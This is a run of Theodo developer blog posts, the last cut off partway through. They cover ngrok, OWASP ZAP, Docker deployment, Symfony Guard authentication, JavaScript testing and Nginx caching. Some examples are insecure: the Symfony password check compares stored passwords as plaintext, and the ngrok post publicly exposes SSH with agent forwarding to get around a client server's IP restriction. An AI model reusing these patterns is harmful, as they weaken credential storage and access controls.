Multiple solutions exist, open-source or not but my favorite is ngrok and you can learn to use it in just 2 minutes. Installation is quite easy, head over to https://ngrok.com/download and follow instructions.
What does it do?
In two words: it takes a local port number in input, and offers you a unique URL, accessible by anyone. For example, let’s assume you are building a very basic web application in php
echo ""Hello World"" > index.php
php -S localhost:8000
Now a web server is running your computer’s port 8000. When you hit http://localhost:8000 on a browser, you can see your application.

How to expose it to the world? It’s simple, just type:
ngrok http 8000
After a few seconds, ngrok will output a few informations, the most important one being “Forwarding”: You now have a unique public URL bound to your local server. Paste it, share it, anyone can use it.


Real-life use-cases
Making bugfix easier on mobile devices
Ever had this weird bug on this specific device that you can’t reproduce anywhere else? Your responsive website is displaying badly on your blackberry’s boss? Sometimes you just don’t know what is the issue and need to code in the dark, test something, see what is happening and repeat. ngrok eases this kind of workflow by preventing you to deploy your modifications again and again.
Developing with webhooks
Webhooks are everywhere, GitHub, Slack, Mandrill, Trello, many applications use them. They allow you to build tools that will be notified when an event occurs. But these applications need public URL to send the payloads to. Tunneling your local environment with ngrok will help you during development process. The GitHub documentation is a good start if you want to get into it.
Dowload a large file from a remote coworker’s computer
Your coworker has downloaded a large file and you want to get it? It can be anything, latest dump of your production database, a base virtual machine, heavy CSV. With ngrok, you can simply run a server (for example PHP built-in server) and expose your file:

Put your largefile.avi file into a folder
Run php -S localhost:8000 on that folder
Run ngrok http 8000 (let’s assume generated URL is https://bc153101.ngrok.io)
Share the url https://bc153101.ngrok.io/largefile.avi

Access a secure server
Two weeks ago a coworker was out of the office and needed to quickly access one of his client’s production server which is IP restricted. How do we managed to do that?

First I created him an account coworker on my laptop
Then I used ngrok to expose my SSH server: ngrok tcp 22. The result was: tcp://0.tcp.ngrok.io:15602
He logged into my machine with: ssh -A -p 15602 coworker@0.tcp.ngrok.io. The -A option ensured its SSH public key was forwarded in order to log into the production server.
Then he was able to run ssh hisclientserver

Conclusion
”I want to expose a local server behind a NAT or firewall to the internet”. The ngrok promise is simple yet powerful. You should definitively think about it next time you struggle with public/private networks, firewalls or just want to get your local environment available to someone. And of course please remain careful with what you expose, and to whom.
Any other use-case comes to your mind? Please feel free to tell us in the comment section.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Matthieu Auger
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										As a Web developer, and above all, as someone who is interested in bringing value as soon as possible to my client, one of my main goals is to release the features I developed into production as soon as possible. In order to do so, I have to make sure my application is as secure as it can be before being deployed in a dangerous and full of malicious users production environment.
Thus, I have no choice: I have to get better in finding and fixing security flaws in my apps, I have to be able to test my apps, and to stop making the same errors twice. And I have to be fast doing it.
This is why I started to use OWASP Zed Attack Proxy!
What is ZAP?
ZAP is an OWASP (Open Web Application Security Project) project. OWASP is an online community which goal is to promote security for Web applications in a free and open way. To achieve their goal, they offer for instance vulnerable applications for every one to test and train on, documentations and recommendations, and security testing tools such as ZAP.
ZAP is therefore an open-source Github project. I could not advise you enough to go and visit the repository to read the code, and, if you are interested enough, to contribute to the project.
The interesting thing about ZAP is it is as useful for beginners in security as for professionals! Beginners can use it because it does not require advanced knowledge before you start getting results using it. Actually, you only need to click on one button to attack your application with minimal configuration.
Once you understand how to use it, you can achieve pretty impressive results. Zap is therefore used by professionals in security and is often rewarded. It has been for instance voted as the best security tool in the ToolsWatch (a famous security website) 2015 Top 10. And as I write this post, ZAP just reached 1000 stars on Github!
What can you use ZAP for?
A proxy
As its name indicates, ZAP is a proxy. It means it will be set between your server and your web browser, and will listen all HTTP requests and responses. You can read and review them, and you can intercept them just after they leave your browser, or just before they come back in. The most interesting part is that you can then modify them. This is pretty useful in order to bypass client only verification for instance.
Passive scanning
As ZAP listens to all HTTP requests and responses you will send and receive, it will parse them, store them in a tree representation of your application. It will also take this opportunity to scan them in order to detect the first vulnerabilities.
Spidering
Whether you developed the application yourself or not, it is highly probable that you will not visit every single link of the application yourself. Whether because you do not know everything about the application, or because it is really too long to visit each page by yourself, it is better to use the spidering tool of ZAP. The goal of this tool is to parse the HTTP responses of the pages you already visited in order to discover new content. Each time it finds a new page, ZAP requests it, and can in turn parse the response. This way, hidden content can be discovered! There again,every new request/response pair is stored in the tree I mentioned earlier. My recommendation is to begin your testing by visiting manually some pages of your application, and then let ZAP list all the rest of its content automatically.
Attack!
When ou are ready to go further, you may begin the real attack. At this point, ZAP active scanning will enable you to find more vulnerabilities such as SQL injections or XSS. Beware! The attacks will really be executed, so be careful, and do not look for such flaws in production environment. You may also use fuzzing to tamper with some parameters of the requests you’re playing with.
Reporting
Every vulnerability reported by ZAP will be displayed in the “Alerts” tab. This is probably my favorite feature in ZAP! There, you will gain huge knowledge in Web Security. For each alert, you can learn about the corresponding flaw. Among other things, you will see which parameter can be used for the exploit, what this vulnerability might enable you to do, how to fix it, and some links to follow in order to discover more about it. Alerts are sorted according to their risk and impact. When some low vulnerabilities might not have too much impact for your application, you should really look into the high ones!
Configuration
When you have found your first vulnerabilities with ZAP, you may want to go further still and make some more powerful and productive testing. For this, you can teach ZAP how your app works, and configure it to make it more accurate. For instance, you could explain to ZAP how it can know whether it is authenticated or not, and how it can be sure to be logged in. This way, even if it follows a logout link or is logged out by the application because of safety mechanisms, it will be able to log in again!
You may also download some community made extensions or scripts (or even write them yourself!) within the application. For example, you may install parameters for better fuzzing, quick start guide, or even a selenium extension. Thereby, there is virtually no limit to what you can achieve with this tool!
Do bad things… for the right reasons
ZAP’s motto above is really meaningful! Everything ZAP enables you to do should be considered as hacking. This means you should never use it against an application that you do not own, or for which you dit not receive specific authorization.
However, you should always test your applications and look for vulnerabilities. First, this is an opportunity to get better and make safer applications for your users! And, more importantly, you do NOT want anybody to find critical flaws in your application. And trust me: if they are accessible on the Web, sooner or later, they will be found.
The only thing left now is for you to download ZAP and go test it! Merry hacking!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Paul Molin
  			
  				  			
  		
    
			

									"
"
										I recently had a quick formation with Benoît Charles-Lavauzelle our CEO at Theodo. He taught me how to be efficient at reading emails. Here are his advices:

don’t sort emails. Use the search.
don’t use multiple labels. One label is enough: urgent or not.
for each mail, there is two options: answer or decide not to answer. Necessarily, if you are to answer, this mail is important. Answer it quickly. Star each mail you have an action to do.
monitor your answering lead time. You must not have email older than 72 hours in your inbox.
start with older emails. It helps for the previous point.
don’t use your mouse, use keyboard shortcuts instead. You must be able to: archive, answer, tag and go to next email without your mouse.
use boomerang (or google inbox’s snooze, or follow-up then) for each of your answers that contains a question mark. It’s the key of the follow up.
don’t use tasks. Your todo list is your inbox. The inbox is your unique entry point.
planify time for reading email and answering the starred ones. 3 times a day is fine.
if it takes less than 2 minutes to answer: do it immediately.

This list isn’t exhaustive. Share your own advice in the comments!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Raphaël Dubigny
  			
  				Raphaël is an agile web developer at Theodo. He uses angular, nodejs and ansible every day.  			
  		
    
			

									"
"
										This article explains the differences I found between Trusty and Xenial to run a Symfony application.
So what’s new in the latest Ubuntu LTS release? On the application side we have:

PHP 7.0
Nginx 1.9.15
Python 3.5
Postgresql 9.5
Mysql 5.7.11
Mongo 2.6.10
Docker 1.10

This nice DigitalOcean post provides a great overview.
From Trusty to Xenial
My goal was to run the default project from the Symfony installer on a Vagrant VM.
I also wanted to be able to use Mysql, Postgresql or Mongodb.
I explain below, all the steps I needed to do so.
First I ran: symfony new xenial64 to quickly get all the Symfony files.
Then I looked for the official Vagrant box of Xenial and found it here.
My next step was using my Ansible playbook generator to get a first draft of a provisioning.
I updated the Vagrantfile to use the right Vagrant box
 and I ran vagrant up.
Unfortunately an error occurred and I wasn’t the only one.
As I didn’t want to wait for the next release of Vagrant, I moved away from the official box
to an unofficial one.
It worked without any error this time.
I then launched the provisioning with ansible-playbook devops/provisioning/playbook.yml -i devops/provisioning/hosts/vagrant and met my first
errors during the PHP role.
Changes related to PHP.
I needed to update the role as we are now using PHP 7.
I manually installed all the PHP packages needed, as I didn’t know their name, this
page was very useful.
Here is a short list:
- php
- php7.0-mysql
- php7.0-pgsql
- php7.0-mcrypt
- php7.0-curl
- php7.0-dev
- php7.0-gd
- php7.0-ldap
- php7.0-sqlite3
- php7.0-intl
- php-apcu

Note that the PHP conf files has also slightly changed their location from /etc/php5 to /etc/php/7.0.

Changes related to Nginx
Everything went well except that the php-fpm socket has changed from /var/run/php5-fpm.sock to /var/run/php/php7.0-fpm.sock.
Changes related to Mongodb
Things are now much simpler than before because a apt-get install mongodb is now enough to install Mongodb.
Postgresql
No problem =)
Mysql
I had one issue with the /etc/mysql/my.cnf configuration file. It has been splitted into different files so it’s a little bit harder to set the right configuration.
Otherwise everything was OK.
Conclusion
And this is it, if you want to try by yourself everything is here.

You will find a Vagrantfile, an Ansible provisioning and the Symfony files.
If you want to know more about Xenial, here are some useful links:

The Subreddit Ubuntu
One Hacker news discussion.

Don’t hesitate to share with us the best links you found. If you have questions, you can ask me on twitter.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Thoonsen
  			
  				Education Hacker. Full Stack developer - Agile and Lean Coach
Twitter: https://twitter.com/maxthoon
Github: https://github.com/MaximeThoonsen  			
  		
    
			

									"
"
										Trello is the perfect online equivalent of the whiteboard
To build a perfect Scrumboard, we need:

Columns and Cards
Complexity points on each card
Number of Cards by column
Card Numbers
Labels

1) Columns and Cards
Trello provides drag&drop cards. Tips: You can use < and > shortcuts to move the card to the near columns.
2) Complexity points on each card
I chose to use ScrummerTheodo to display complexity points on each card. Thanks to this extension, we can also add “post estimated” complexity points afterwards. Bonus: The sum of every column’s cards is displayed on top of it.

ScrummerTheodo, Chrome Extension
ScrummerTheodo, Firefox Extension

REX: I used Scrum for Trello Plugins but it slowed down the board too much. So Theodoers decided to fork Vanilla JS Plugins rickpastoor/scrummer in order to add post estimation feature and improve UX.
3) Number of Cards by column
I first used the CardCounter for Trello plugin. Personnaly, I find the big permanent orange square is too flashy and add noise to the board.
I prefer f shortcut and type *. This will filter all the cards by ‘nothing’ and display the number of cards found in each column. No plugin to add and display the number of cards only when you need it.
4) Card Numbers
I chose to use a plugin that have only one job and make it good:

Trello Card Numbers, Chrome Extension
Trello Card Numbers, Firefox Extension

You can use Stylish and find a CSS Theme that will change your board appareance in order to display the Card Number. Cons: Stylish ask the permission to read all data from all the websites you visit.. then it’s difficult to find a theme that not break the Trello design.
5) Labels
There’s an extension for that:

Card Color Titles for Trello, Chrome Extension
Card Color Title for Trello, Firefox Extension

Enjoy!

Be agile and deliver fast!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Jonathan Beurel
  			
  				Jonathan Beurel - Web Developer. Twitter : @jonathanbeurel  			
  		
    
			

									"
"
										GitHub released in February a new functionality that the community has been asking for years. It’s now possible to set up templates for issues and pull requests!
How does it work?
Implementing these new templates is quite easy.
Step One:
Create a .github folder in the root directory of your project.
cd ../path/to/your/project
mkdir .github

Step Two:
Add a PULL_REQUEST_TEMPLATE.md or/and ISSUE_TEMPLATE.md in the .github folder you’ve just created.
cd .github
vim PULL_REQUEST_TEMPLATE.md
# your template for PRs
vim ISSUE_TEMPLATE.md
# your template for issues

Here is an example of what your pull request template might look like:
## Link to the user story
[User Story 3](https://trello.com/path/to/my/board)

## Screenshots

## Types of changes

- [ ] Bug fix
- [ ] New feature
- [ ] Breaking change

## Maintainability & Security

- [ ] The feature is tested
- [ ] My PR complies with the security checklist
- [ ] The code coverage is higher than 80%

## Coding Style
- [ ] Functions are no longer than 30 lines
- [ ] Each function is only performing one task
- [ ] Files are no longer than 200 lines

<!-- You can add as many items as you like. Your imagination is the limit. -->


If you feel like you can get easily bored by this task, you might want to use this bookgame 😉.
Step Three:
Commit, push and that’s it, you are ready to go 😃. Now each time a contributor will open a pull request or an issue on your project, the body of their request will be pre-filled with the template you’ve created.
Why templates have more impact than you think
It is so easy to implement, that it seems to be a little thing. It can actually make both your life and those of your contributors easier:

Your contributors will know exactly what information they have to give you and what actions they have to perform in order to see their request treated.
Your contributors know the standards they must follow therefore it increase the code quality of your application.
You will be able to assess how much time you will have to spend on the request without having to put extra effort looking for the information you need.

At Theodo we are quite fond of this new feature since it helps us constantly improving the quality of our work. For instance, we’ve noticed that functionalities have often been refused by our product owner for the same reason (e.g. we didn’t follow the wireframe). We added an item to the checklist prevent this reason from appearing again. In our case, it was “I have checked that the functionality complies with the wireframes”. Thanks to the template we never forget to follow the wireframe thus never waste the time of our product owner with this problem anymore. That’s why templates are a good way to increase the value we bring to our clients.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Thibault Coudray
  			
  				Developer at Theodo.  			
  		
    
			

									"
"
										Docker shakes up the way we use to put into production. In this article I’ll present
the main obstacles I encountered to set up the production workflow of a simple Node.js API called cinelocal.
Erratum: I am now using docker-machine instead of ansible. You can read in the comments why
Step 1: set up a development environment
Docker-compose is a tool for defining and running multi-container Docker applications. Cinelocal-api requires 3 services running in 3 containers:

node
postgres
data (docker recommends to use a separated container for persisted data)

Here is the corresponding docker-compose.yml defining the 3 services and their relations (read more about compose files):

  
# docker-compose.yml
data:
  image: busybox
  volumes:
    - /data

db:
  image: postgres:9.4
  volumes_from:
    - data
  ports:
    - ""5432:5432""

api:
  image: node:wheezy
  working_dir: /app
  volumes:
    - .:/app
  links:
   - db
  ports:
    - ""8000:8000""
  command: npm run watch
  

Notice the .:/app line in the API container that mounts the current folder as a container’s volume so when you edit a source file it will be detected inside the container.
The npm command of the API container is defined in the package.json file. It runs database migrations (if any) and starts nodemon which is a utility that monitors for any change in your source and automatically restarts your server.
package.json:

{
  ""scripts"": {
    ""watch"": ""db-migrate up --config migrations/database.json && node ./node_modules/nodemon/bin/nodemon.js src/server.coffee""
  }
}

Now the API can be started using the command docker-compose up api (it might crash the first time because the node container does not wait for the postgres container to be ready. It will work the second time. This is a known compose issue).
Unfortunately using Docker adds a layer of complexity to the usual commands such as installing a new Node.js package or creating a new migration because it must be run in the container. So:

All your commands should be prefixed by docker-compose run --rm api
The edited files (package.json with npm install or migration files with db-migrate) will be owned by the docker user.

To bypass this complexity, you can use a Makefile that provides a set of commands.

# Makefile
whoami := $(shell whoami)

migration-create:
    docker-compose run --rm api \
    ./node_modules/db-migrate/bin/db-migrate create --config migrations/database.json $(name)\
     && sudo chown -R ${whoami}:${whoami} migrations

migration-up:
    docker-compose run --rm api ./node_modules/db-migrate/bin/db-migrate up --config migrations/database.json

migration-down:
    docker-compose run --rm api ./node_modules/db-migrate/bin/db-migrate down --config migrations/database.json

install:
  docker-compose run --rm api npm install

npm-install:
    docker-compose run --rm api \
    npm install --save $(package)\
    && sudo chown ${whoami}:${whoami} package.json

Now to install a package you can run: make npm-install package=lodash or to create a new migration: make migration-create name=add-movie-table.
Step 2: Provisioning a server
With Docker, whatever your stack is, the provisioning will be the same. You’ll have to install docker and optionally docker-compose, that’s it.
Ansible is a great tool to provision a server. You can compose a playbook with roles found on ansible galaxy.
To install docker and docker-compose on a server:

# devops/provisioning.yml
- name: cinelocal-api provisioning
  hosts: all
  sudo: true
  pre_tasks:
    - locale_gen: name=en_US.UTF-8 state=present
  roles:
    - angstwad.docker_ubuntu
    - franklinkim.docker-compose
  vars:
    docker_group_members:
      - ubuntu
    update_docker_package: true

Before running the playbook you need to install the roles:

ansible-galaxy install -r devops/requirements.yml -p devops/roles

with:

# devops/requirements.yml
- src: angstwad.docker_ubuntu
- src: franklinkim.docker-compose

I tested this provisioning with Ansible 2.0.2 on Ubuntu Server 14.04.

# Makefile
install:
  ansible-galaxy install -r devops/requirements.yml -p devops/roles

provisioning:
    ansible-playbook devops/provisioning.yml -i devops/hosts/production

Step 3: Package your app and deploy
Each time I deploy the API, I build a new Docker image that I push on Docker Hub (the GitHub of Docker images).
The construction of the API image is described in a Dockerfile:

FROM node:wheezy

# Create app directory
RUN mkdir -p /app
WORKDIR /app

# Install app dependencies
COPY package.json /app/
RUN npm install

# Bundle app source
COPY . /app

EXPOSE 8000
CMD [ ""npm"", ""start"" ]

To build and push the image on Docker Hub, I added these two tasks in the Makefile:

# Makefile
build:
    docker build -t nicgirault/cinelocal-api .

push: build
    docker push nicgirault/cinelocal-api

Now make push builds the image and pushes it on Docker Hub (after authentication).
In development environment I want to mount my code as a volume whereas it should not be the case in production. Using multiple Compose files enables you to customize a Compose application for different  environments. In our case, we want to split the description of the api service in a common configuration and a environment specific configuration.

# docker-compose.yml (common configuration)
api:
  working_dir: /app
  links:
   - db
  ports:
    - ""8000:8000""
  environment:
    DB_DATABASE: postgres
    DB_USERNAME: postgres


# docker-compose.dev.yml (development specific configuration)
api:
  image: node:wheezy
  volumes:
    - .:/app
  command: npm run watch


# docker-compose.prod.yml (production specific configuration)
api:
  image: nicgirault/cinelocal-api

To merge the specific configuration into the common configuration:

  
    docker-compose -f docker-compose.yml -f docker-compose.dev.yml up api
  

By default, Compose checks the presence of docker-compose.override.yml so I renamed docker-compose.dev.yml to docker-compose.override.yml.
Now I can deploy the API using 3 commands described in a simple Ansible playbook:

# devops/deploy.yml
- name: Cinelocal-api deployment
  hosts: all
  sudo: true
  vars:
    repository: https://github.com/nicgirault/cinelocal-api.git
    path: /home/ubuntu/www
    image: nicgirault/cinelocal-api
  tasks:
    - name: Pull github code
      git: repo={{ repository }}
           dest={{ path }}

    - name: Pull API container
      shell: docker pull {{ image }}

    - name: Start API container
      shell: docker-compose -f docker-compose.yml -f docker-compose.prod.yml up -d api
      args:
        chdir: {{ path }}

In the Makefile:

deploy: push
    ansible-playbook -i devops/hosts/production devops/deploy.yml

make deploy builds the image, pushes it and runs the playbook.
Read more about docker-compose in production.
Note: Ansible embeds docker commands that avoid installing docker-compose on the server but force to duplicate the docker architecture description. Although I didn’t use it for this project you might consider using it.
Bonus: continuous integration
This section explains how to automatically deploy on production when merging on the master branch if the build passes.
This is quite simple with circleCI and Docker Hub:
Here is a circle.yml file that runs the tests and deploys if the build passes provided the destination branch is master:

machine:
  services:
    - docker
  python:
    version: 2.7.8
  post:
    # circle instance already run postgresql
    - sudo service postgresql stop

dependencies:
  pre:
    - pip install ansible
    - pip install --upgrade setuptools

  override:
    - docker info
    - docker build -t nicgirault/cinelocal-api .

test:
  override:
    - docker-compose run api npm test

deployment:
  prod:
    branch: master
    commands:
      - docker login -e $DOCKER_EMAIL -u $DOCKER_USER -p $DOCKER_PASS
      - docker push nicgirault/cinelocal-api
      - echo ""openstack ansible_host=$PROD_HOST ansible_ssh_user=$PROD_USER"" > devops/hosts/production
      - ansible-playbook -i devops/hosts/production devops/deploy.yml

In addition you’ll have to:

define the environment variables used in this file in the circleCI project settings page
authorize circleCI to deploy on your server:

generate a ssh key pair (use the command ssh-keygen)
add the private key on the project settings on circleCI interface
add the public key on the ~/.ssh/autorized_keys on the server



From now deploying on production will be as simple as merging a branch to master.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Nicolas Girault
  			
  				Nicolas is a web developer eager to create value for trustworthy businesses.
Surrounded by agile gurus at Theodo, he builds simple solutions along with tech-passionates.  			
  		
    
			

									"
"
										Building a custom authentication system for Symfony can get atrocious.
You can get a glimpse of that here.
You have to deal with multiple classes, connect them to each other, and hope for the best.
It is hard to customize and never fun to work with.
Since Symfony 2.8, to simplify the customization of the authentication process, Guard has been introduced.
With Guard, you will not have any struggle building your own authentication system.
It does not redesign the existing authentication system included in Symfony, it plugs itself onto it, making your life easier.
Let’s explain how it works, and how you can use it!
Creating an Authenticator
With Guard, every step of the authentication process is handled by only one class: an Authenticator.
This class will have to implement the provided GuardAuthenticatorInterface.
This interface comes with seven simple methods:
start(Request $request, AuthenticationException $authException = null)
This gets called when the user tries to access a resource that requires authentication, but no authentication information was found in the request.
Its job is to inform the client that he has to send those authentication details.
This method is a bit different from the others, since it comes from AuthenticationEntryPointInterface, which is extended by GuardAuthenticatorInterface.
For example, you could redirect him to the login page:
/**
 * @var \Symfony\Component\Routing\RouterInterface
 */
private $router;

public function start(Request $request, AuthenticationException $authException = null)
{
  $url = $this->router->generate('login');
  return new RedirectResponse($url);
}

getCredentials(Request $request)
This method will get called on every request that requires an authentication.
Its job is to read the authentication information contained in the request, and return it.
You can return what you want! The only purpose what you return is to get used in the getUser() and checkCredentials() methods.
If this method returns null, authentication will fail.
So if the endpoint requires an authentication, the method start() will get called.
If not, the authentication gets skipped, the user is the famous ""anon"".
If you return a non null value, the method getUser() will get called.
Two examples:
// for an API
public function getCredentials(Request $request)
{
  return $request->headers->get('X-API-TOKEN');
}

// for a form login
public function getCredentials(Request $request)
{
  return array(
    'username' => $request->request->get('_username'),
    'password' => $request->request->get('_password'),
  );
}

getUser($credentials, UserProviderInterface $userProvider)
After you’ve gotten the credentials, you will try to get the User associated with those credentials.
The value of the credentials is passed to getUser() as the $credentials argument.
The job of this method is to return an object implementing UserInterface.
If it does, the next step of the authentication will be called: checkCredentials().
Else, the authentication will fail and the method onAuthenticationFailure() will get called.
An example:
# for an API
public function getUser($credentials, UserProviderInterface $userProvider)
{
  $user = $this->em->getRepository('AppBundle:User')
      ->findOneBy(array('apiToken' => $credentials));

  return $user;
}

checkCredentials($credentials, UserInterface $user)
The job of this method is to check if the credentials of the previously returned User are correct.
This method can do two things.
If it returns true, the user will be authenticated, and the method onAuthenticationSuccess() will be called.
If does not, the authentication fails and the method onAuthenticationFailure() is called.
Even if it works without, throwing any kind of AuthenticationException lets you explicit what went wrong.
An example with a password:
public function checkCredentials($credentials, UserInterface $user)
{
  if ($user->getPassword() === $credentials['password']) {
    return true;
  }

  throw new MyCustomAuthenticationException('The credentials are wrong!');
}

onAuthenticationSuccess(Request $request, TokenInterface $token, $providerKey)
This method is called when the user is successfully authenticated.
It can return null, in which case the request continues to process as expected, or return a Reponse object, in which case this Response will be transfered to the user.
For example, you can redirect your users to the homepage:
/**
 * @var \Symfony\Component\Routing\RouterInterface
 */
private $router;

public function __construct(RouterInterface $router)
{
  $this->router = $router;
}

# ...

public function onAuthenticationSuccess(Request $request, TokenInterface $token, $providerKey)
{
  $url = $this->router->generate('homepage');

  return new RedirectResponse($url);
}

onAuthenticationFailure(Request $request, AuthenticationException $exception)
This method is called when the authentication fails.
Its job is to return a Reponse object that will be sent to the client.
You will know what went wrong in the process with the $exception parameter.
For example, you can return a custom JSON response:
public function onAuthenticationFailure(Request $request, AuthenticationException $exception)
{
  return new JsonResponse(array('message' => $exception->getMessageKey()), Response::HTTP_FORBIDDEN);
}

supportsRememberMe()
Return true with this method if you want the remember me functionality to be active, false otherwise.
It will still requires the activation of the remember_me under your firewall to work.
A very simple example:
public function supportsRememberMe()
{
  return false;
}

registering your Authenticator
You have built a very nice Authenticator, but how can you use it in your application?
First, register in your security.yml file, under the firewall sections, that you will be using Guard.
For example:
firewalls:
    secured_area:
        anonymous: ~
        logout:
            path:   /logout
              target: /
        guard:
            authenticators:
                - my_custom_authenticator

Then, register your Authenticator as a service, for example in your service.yml:
services:
    my_custom_authenticator:
        class: AppBundle\Security\Authenticator
        arguments: [""@router""]

You can even specify multiple authenticators like so:
guard:
    authenticators:
        - my_custom_authenticator
        - my_facebook_authenticator
    entry_point: my_custom_authenticator

It this case, you will have to tell your application which authenticator will be your entry point, that is which start() method will be called when an anonymous user tries to access a resource requiring authentication.
And that’s it! You can now build your own custom authentication process, and only by implementing very simple methods.
You can easily use Guard to allow an authentication via Facebook, Google+, Github or whatever application you want.
Have a nice time building your Symfony authentication systems!
 

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Antoine Kahn
  			
  				Webdeveloper at Theodo.  			
  		
    
			

									"
"
										In the previous article we discovered how to write simple unit tests thanks to the Mocha-Sinon-Chai stack. Let’s now continue with this stack and focus on a problem we will necessarily be confronted to if we use JavaScript: testing asynchronous code.
A full working example of the code snippets shown below can be found in this repository: https://github.com/tib-tib/demo-js-tests-part-2. There are several ways to do asynchronous JavaScript. I focused on callbacks and promises.
How to test an asynchronous function with callback?
To begin with, let’s take a simple example of a function retrieving a list of superheroes:
var SuperheroModel = require('./SuperheroModel');
var logger = require('./logger');

module.exports = {
  getSuperheroesList: function (callback) {
    SuperheroModel.find(function (error, superheroes) {
      if(error) {
        logger.error(error);
      }
      return callback(error, superheroes);
    });
  }
};

Here, we have an asynchronous call to a find method of a superhero model.
We want to test two things:

if there is an error, check that it is logged and returned.
if all went well, check that the getSuperheroesList function returns the superheroes list.

To achieve this, we need to create a stub of our find method. However, we cannot use the returns function of the stub as we do usually, because the find method here returns its results via its callback.
In fact, we have to tell the stub to call the callback function with the specific values we want. To do so, Sinon provides us a callsArgWith function. This function takes as parameters the argument index to which we will pass values, and the values to pass.
Let’s see how it goes:
var sinon = require('sinon');
var sinonChai = require('sinon-chai');
var chai = require('chai');
var should = chai.should();
chai.use(sinonChai);

var superheroService = require('./superheroService');
var SuperheroModel = require('./SuperheroModel');
var logger = require('./logger');

var sandbox;
var findStub;

describe('superheroService', function() {
  beforeEach(function() {
    sandbox = sinon.sandbox.create();
    findStub = sandbox.stub(SuperheroModel, 'find');
    sandbox.stub(logger, 'error');
  });

  afterEach(function() {
    sandbox.restore();
  });

  it('should return a list of superheroes', function() {
    var superheroesList = ['Batman', 'Superman', 'Iron Man'];
    findStub.callsArgWith(0, null, superheroesList);

    superheroService.getSuperheroesList(function (error, result) {
      should.not.exist(error);
      result.should.deep.equal(superheroesList);
    });
  });

  it('should log and return an error', function() {
    findStub.callsArgWith(0, 'A_BIG_ERROR');

    superheroService.getSuperheroesList(function (error, result) {
      error.should.equal('A_BIG_ERROR');
      should.not.exist(result);
      logger.error.should.have.been.calledWithExactly('A_BIG_ERROR');
    });
  });
})


Thereby, in the first test we specify with a findStub that the callback of the find method has to be called with no error and a fake superheroes list, whereas in the second one we tell to call it with an error.
You can notice the presence of sinon-chai, that extends Chai with custom assertions such as calledWithExactly.
We also used a sandbox in the beforeEach and afterEach functions.
It allows us to restore all the stubs defined between each test of the suite.
Now let’s take a look at the same example with a promise.
How to test an asynchronous function with promise?
Now assume the getSuperheroesList function looks like this:
var SuperheroModel = require('./SuperheroModel');
var logger = require('./logger');

module.exports = {
  getSuperheroesList: function () {
    return SuperheroModel.find()
    .then(function (superheroes) {
      return superheroes;
    })
    .catch(function (error) {
      logger.error(error);
      throw error;
    });
  }
};


In the same way as above, we want to test the two situations (when the promise is resolved and when it is rejected):
var sinon = require('sinon');
var sinonChai = require('sinon-chai');
var chai = require('chai');
var should = chai.should();
chai.use(sinonChai);

var superheroService = require('./superheroService');
var SuperheroModel = require('./SuperheroModel');
var logger = require('./logger');

var sandbox;
var findStub;

describe('superheroService', function() {
  beforeEach(function() {
    sandbox = sinon.sandbox.create();
    findStub = sandbox.stub(SuperheroModel, 'find');
    sandbox.stub(logger, 'error');
  });

  afterEach(function() {
    sandbox.restore();
  });

  it('should return a list of superheroes', function() {
    var superheroesList = ['Batman', 'Superman', 'Iron Man'];
    findStub.returns(new Promise(function(resolve) {
      resolve(superheroesList);
    }));

    return superheroService.getSuperheroesList()
    .then(function(result) {
      result.should.deep.equal(superheroesList);
    });

  });

  it('should log and return an error', function() {
    findStub.returns(new Promise(function(resolve, reject) {
      reject('A_BIG_ERROR');
    }));

    return superheroService.getSuperheroesList()
    .catch(function(error) {
      error.should.equal('A_BIG_ERROR');
      logger.error.should.have.been.calledWithExactly('A_BIG_ERROR');
    });
  });
})

The findStub now returns in the first test a resolved promise and in the second one a rejected promise.
You can simplify your promises tests by using the Chai as Promised library. It allows you to use directly assertions on your promises instead of writing the promise handlers manually. You can see the same example as above with this library in my repository.
Now that you know the basics about asynchronous testing in JavaScript, you have no more excuses to not unit testing your code!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Thibaut Gatouillat
  			
  				Agile web developer at Theodo.  			
  		
    
			

									"
"
										Sometimes, improving the user’s loading experience is not enough, and you need real changes to make your application load faster.
So you try CSS and JS minification or image compression but your app is only a bit faster to load. These tricks reduce the size of resources that need to be downloaded, but what if your users didn’t have to download anything at all? That’s what caching is for!
In this article, I will explain how you can configure Nginx to enable the browser cache, thus avoiding painfully slow downloads. If you are not familiar with Nginx, I recommend reading this article.
How HTTP caching works
Cache configuration is done on the server side. Basically, it is the server’s role to specify to the client any of these (with HTTP headers):

if the resource may be cached
by which type of cache the resource may be cached
when the cached resource should expire
when the resource was last modified

But it is worth keeping in mind that it is the client’s responsibility to take the appropriate decision according to what the server replies. In particular, if you disable the cache in your browser or if you force the refresh of the page, the server’s answer will not be taken into account and you will download the resources, no matter what.
If you’re interested in knowing how the headers can be set to achieve the desired caching policy, I recommend this article. In the following part I will focus on how Nginx can be configured to send the proper headers.
On the client’s side
The browser (without you noticing) automatically generates headers based on the resource already cached. The goal of these headers is to check if the cached resource is still fresh. There are two ways of doing that:

check if the resource has been modified since it was cached
check if the identifier of the resource (usually a digest) has changed




Header
Meaning




If-Modified-Since: Thu, 26 May 2016 00:00:00 GMT
The server is allowed to return a status 304 (not modified) if the resource has not been modified since that date.


If-None-Match: ""56c62238977a31353ce7716e759a7edb""
The server is allowed to return a status 304 (not modified) if the resource identifier is the same.



